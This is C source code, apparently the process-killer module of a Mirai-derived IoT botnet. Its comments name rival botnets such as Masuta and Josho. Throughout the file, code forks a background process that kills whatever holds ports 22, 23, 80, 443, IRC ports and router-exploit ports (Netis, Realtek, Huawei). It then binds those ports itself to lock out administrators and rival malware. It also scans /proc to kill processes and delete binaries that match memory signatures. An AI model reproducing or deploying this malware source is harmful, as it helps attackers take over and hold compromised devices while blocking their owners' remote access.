#define _GNU_SOURCE
#ifdef DEBUG
#include <stdio.h>
#endif
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <linux/limits.h>
#include <sys/types.h>
#include <dirent.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>
#include "includes.h"
#include "killer.h"
#include "table.h"
#include "util.h"
int killer_pid;
char *killer_realpath;
int killer_realpath_len = 0;
void killer_init(void)
{
    int killer_highest_pid = KILLER_MIN_PID, last_pid_scan = time(NULL), tmp_bind_fd;
    uint32_t scan_counter = 0;
    struct sockaddr_in ssh_bind_addr;
    int ssh_bind_fd;
    struct sockaddr_in tel_bind_addr;
    int tel_bind_fd;
    struct sockaddr_in netis_bind_addr;
    int netis_bind_fd;
    struct sockaddr_in http_bind_addr;
    int http_bind_fd;
    struct sockaddr_in rt_bind_addr;
    int rt_bind_fd;
    struct sockaddr_in hw_bind_addr;
    int hw_bind_fd;
    killer_pid = fork();
    if (killer_pid > 0 || killer_pid == -1)
        return;
    sleep(5);
    killer_realpath = malloc(PATH_MAX);
    killer_realpath[0] = 0;
    killer_realpath_len = 0;
    if (!has_exe_access())
    {
        return;
    }
    while (TRUE)
    {
        DIR *dir;
        struct dirent *file;
        table_unlock_val(TABLE_KILLER_PROC);
        if ((dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL))) == NULL)
        {
            break;
        }
        table_lock_val(TABLE_KILLER_PROC);
    if (killer_kill_by_port(htons(48101)))
    {
        //OG mirai SIP
    }
    if (killer_kill_by_port(htons(1991)))
    {
        //Masuta mirai SIP
    }
    if (killer_kill_by_port(htons(1338)))
    {
        //Sold Josho mirai SIP
    }
    if (killer_kill_by_port(htons(80)))
    {
        //HTTP Server/Some IRC's Use This
    }
    if (killer_kill_by_port(htons(443)))
    {
        //SSL/HTTP/Some IRC's Use This
    }
    if (killer_kill_by_port(htons(4321)))
    {
        //Some IRC's Use This
    }
    if (killer_kill_by_port(htons(6667)))
    {
        //Def IRC 1
    }
    if (killer_kill_by_port(htons(6697)))
    {
        //Def IRC 2
    }
    if (killer_kill_by_port(htons(22)))
    {
        //SSH Port/Bind To
    }
    ssh_bind_addr.sin_port = htons(22);
    tel_bind_addr.sin_port = htons(23);
    netis_bind_addr.sin_port = htons(53413);
    http_bind_addr.sin_port = htons(80);
    hw_bind_addr.sin_port = htons(37215);
    rt_bind_addr.sin_port = htons(52869);
    if ((ssh_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(ssh_bind_fd, (struct sockaddr *)&ssh_bind_addr, sizeof (struct sockaddr_in));
        listen(ssh_bind_fd, 1);
    }
    if (killer_kill_by_port(htons(23)) || killer_kill_by_port(htons(53413)) || killer_kill_by_port(htons(80)) || killer_kill_by_port(htons(52869)) || killer_kill_by_port(htons(37215)))
    {
        //Bind To Telnet, Netis, HTTP, Realtek, and Huawei
    }
    if ((tel_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(tel_bind_fd, (struct sockaddr *)&tel_bind_addr, sizeof (struct sockaddr_in));
        listen(tel_bind_fd, 1);
    }
    if ((netis_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(netis_bind_fd, (struct sockaddr *)&netis_bind_addr, sizeof (struct sockaddr_in));
        listen(netis_bind_fd, 1);
    }
    if ((http_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(http_bind_fd, (struct sockaddr *)&http_bind_addr, sizeof (struct sockaddr_in));
        listen(http_bind_fd, 1);
    }
    if ((rt_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(rt_bind_fd, (struct sockaddr *)&rt_bind_addr, sizeof (struct sockaddr_in));
        listen(rt_bind_fd, 1);
    }
    if ((hw_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
    {
        bind(hw_bind_fd, (struct sockaddr *)&hw_bind_addr, sizeof (struct sockaddr_in));
        listen(hw_bind_fd, 1);
    }
        while ((file = readdir(dir)) != NULL)
        {
            if (*(file->d_name) < '0' || *(file->d_name) > '9')
                continue;
            char exe_path[64], *ptr_exe_path = exe_path, realpath[PATH_MAX];
            char status_path[64], *ptr_status_path = status_path;
            int rp_len, fd, pid = atoi(file->d_name);
            scan_counter++;
            if (pid <= killer_highest_pid)
            {
                if (time(NULL) - last_pid_scan > KILLER_RESTART_SCAN_TIME)
                {
                    killer_highest_pid = KILLER_MIN_PID;
                }
                else
                {
                    if (pid > KILLER_MIN_PID && scan_counter % 10 == 0)
                        sleep(1);
                }
                continue;
            }
            if (pid > killer_highest_pid)
                killer_highest_pid = pid;
            last_pid_scan = time(NULL);
            table_unlock_val(TABLE_KILLER_PROC);
            table_unlock_val(TABLE_KILLER_EXE);
            ptr_exe_path += util_strcpy(ptr_exe_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            ptr_exe_path += util_strcpy(ptr_exe_path, file->d_name);
            ptr_exe_path += util_strcpy(ptr_exe_path, table_retrieve_val(TABLE_KILLER_EXE, NULL));
            ptr_status_path += util_strcpy(ptr_status_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            ptr_status_path += util_strcpy(ptr_status_path, file->d_name);
            ptr_status_path += util_strcpy(ptr_status_path, table_retrieve_val(TABLE_KILLER_STATUS, NULL));
            table_lock_val(TABLE_KILLER_PROC);
            table_lock_val(TABLE_KILLER_EXE);
            if ((rp_len = readlink(exe_path, realpath, sizeof (realpath) - 1)) != -1)
            {
                realpath[rp_len] = 0;
                table_unlock_val(TABLE_KILLER_ANIME);
                if (util_stristr(realpath, rp_len - 1, table_retrieve_val(TABLE_KILLER_ANIME, NULL)) != -1)
                {
                    unlink(realpath);
                    kill(pid, 9);
                }
                table_lock_val(TABLE_KILLER_ANIME);
                if (pid == getpid() || pid == getppid() || util_strcmp(realpath, killer_realpath))
                    continue;

                if ((fd = open(realpath, O_RDONLY)) == -1)
                {
                    kill(pid, 9);
                }
                close(fd);
            }

            if (memory_scan_match(exe_path))
            {
                kill(pid, 9);
            } 
            util_zero(exe_path, sizeof (exe_path));
            util_zero(status_path, sizeof (status_path));

            sleep(1);
        }

        closedir(dir);
    }

#ifdef DEBUG
    printf("[killer] Finished\n");
#endif
}

void killer_kill(void)
{
    kill(killer_pid, 9);
}

BOOL killer_kill_by_port(port_t port)
{
    DIR *dir, *fd_dir;
    struct dirent *entry, *fd_entry;
    char path[PATH_MAX] = {0}, exe[PATH_MAX] = {0}, buffer[513] = {0};
    int pid = 0, fd = 0;
    char inode[16] = {0};
    char *ptr_path = path;
    int ret = 0;
    char port_str[16];

#ifdef DEBUG
    printf("[killer] Finding and killing processes holding port %d\n", ntohs(port));
#endif

    util_itoa(ntohs(port), 16, port_str);
    if (util_strlen(port_str) == 2)
    {
        port_str[2] = port_str[0];
        port_str[3] = port_str[1];
        port_str[4] = 0;

        port_str[0] = '0';
        port_str[1] = '0';
    }

    table_unlock_val(TABLE_KILLER_PROC);
    table_unlock_val(TABLE_KILLER_EXE);
    table_unlock_val(TABLE_KILLER_FD);
    table_unlock_val(TABLE_KILLER_TCP);

    fd = open(table_retrieve_val(TABLE_KILLER_TCP, NULL), O_RDONLY);
    if (fd == -1)
        return 0;

    while (util_fdgets(buffer, 512, fd) != NULL)
    {
        int i = 0, ii = 0;

        while (buffer[i] != 0 && buffer[i] != ':')
            i++;

        if (buffer[i] == 0) continue;
        i += 2;
        ii = i;

        while (buffer[i] != 0 && buffer[i] != ' ')
            i++;
        buffer[i++] = 0;

        // Compare the entry in /proc/net/tcp to the hex value of the htons port
        if (util_stristr(&(buffer[ii]), util_strlen(&(buffer[ii])), port_str) != -1)
        {
            int column_index = 0;
            BOOL in_column = FALSE;
            BOOL listening_state = FALSE;

            while (column_index < 7 && buffer[++i] != 0)
            {
                if (buffer[i] == ' ' || buffer[i] == '\t')
                    in_column = TRUE;
                else
                {
                    if (in_column == TRUE)
                        column_index++;

                    if (in_column == TRUE && column_index == 1 && buffer[i + 1] == 'A')
                    {
                        listening_state = TRUE;
                    }

                    in_column = FALSE;
                }
            }
            ii = i;

            if (listening_state == FALSE)
                continue;

            while (buffer[i] != 0 && buffer[i] != ' ')
                i++;
            buffer[i++] = 0;

            if (util_strlen(&(buffer[ii])) > 15)
                continue;

            util_strcpy(inode, &(buffer[ii]));
            break;
        }
    }
    close(fd);
    if (util_strlen(inode) == 0)
    {
        table_lock_val(TABLE_KILLER_PROC);
        table_lock_val(TABLE_KILLER_EXE);
        table_lock_val(TABLE_KILLER_FD);
        table_lock_val(TABLE_KILLER_TCP);
        return 0;
    }
    if ((dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL))) != NULL)
    {
        while ((entry = readdir(dir)) != NULL && ret == 0)
        {
            char *pid = entry->d_name;
            if (*pid < '0' || *pid > '9')
                continue;
            util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_EXE, NULL));
            if (readlink(path, exe, PATH_MAX) == -1)
                continue;
            util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));
            if ((fd_dir = opendir(path)) != NULL)
            {
                while ((fd_entry = readdir(fd_dir)) != NULL && ret == 0)
                {
                    char *fd_str = fd_entry->d_name;
                    util_zero(exe, PATH_MAX);
                    util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), pid);
                    util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), "/");
                    util_strcpy(ptr_path + util_strlen(ptr_path), fd_str);
                    if (readlink(path, exe, PATH_MAX) == -1)
                        continue;
                    if (util_stristr(exe, util_strlen(exe), inode) != -1)
                    {
                        kill(util_atoi(pid, 10), 9);
                        ret = 1;
                    }
                }
                closedir(fd_dir);
            }
        }
        closedir(dir);
    }
    sleep(1);
    table_lock_val(TABLE_KILLER_PROC);
    table_lock_val(TABLE_KILLER_EXE);
    table_lock_val(TABLE_KILLER_FD);
    return ret;
}

static BOOL has_exe_access(void)
{
    char path[PATH_MAX], *ptr_path = path, tmp[16];
    int fd, k_rp_len;
    table_unlock_val(TABLE_KILLER_PROC);
    table_unlock_val(TABLE_KILLER_EXE);
    ptr_path += util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
    ptr_path += util_strcpy(ptr_path, util_itoa(getpid(), 10, tmp));
    ptr_path += util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_EXE, NULL));
    if ((fd = open(path, O_RDONLY)) == -1)
    {
        return FALSE;
    }
    close(fd);
    table_lock_val(TABLE_KILLER_PROC);
    table_lock_val(TABLE_KILLER_EXE);
    if ((k_rp_len = readlink(path, killer_realpath, PATH_MAX - 1)) != -1)
    {
        killer_realpath[k_rp_len] = 0;
    }
    util_zero(path, ptr_path - path);
    return TRUE;
}
static BOOL memory_scan_match(char *path)
{
    int fd, ret;
    char rdbuf[4096];
    char *m_route, *m_asswd;
    int m_route_len, m_asswd_len;
    BOOL found = FALSE;
    if ((fd = open(path, O_RDONLY)) == -1)
        return FALSE;
    table_unlock_val(TABLE_MEM_ROUTE);
	table_unlock_val(TABLE_MEM_ASSWD);
    m_route = table_retrieve_val(TABLE_MEM_ROUTE, &m_route_len);
	m_asswd = table_retrieve_val(TABLE_MEM_ASSWD, &m_asswd_len);
    while ((ret = read(fd, rdbuf, sizeof (rdbuf))) > 0)
    {
        if (mem_exists(rdbuf, ret, m_route, m_route_len) ||
		    mem_exists(rdbuf, ret, m_asswd, m_asswd_len))
        {
            found = TRUE;
            break;
        }
    }
    table_lock_val(TABLE_MEM_ROUTE);
	table_lock_val(TABLE_MEM_ASSWD);
    close(fd);
    return found;
}
static BOOL mem_exists(char *buf, int buf_len, char *str, int str_len)
{
    int matches = 0;
    if (str_len > buf_len)
        return FALSE;
    while (buf_len--)
    {
        if (*buf++ == str[matches])
        {
            if (++matches == str_len)
                return TRUE;
        }
        else
            matches = 0;
    }
    return FALSE;
}
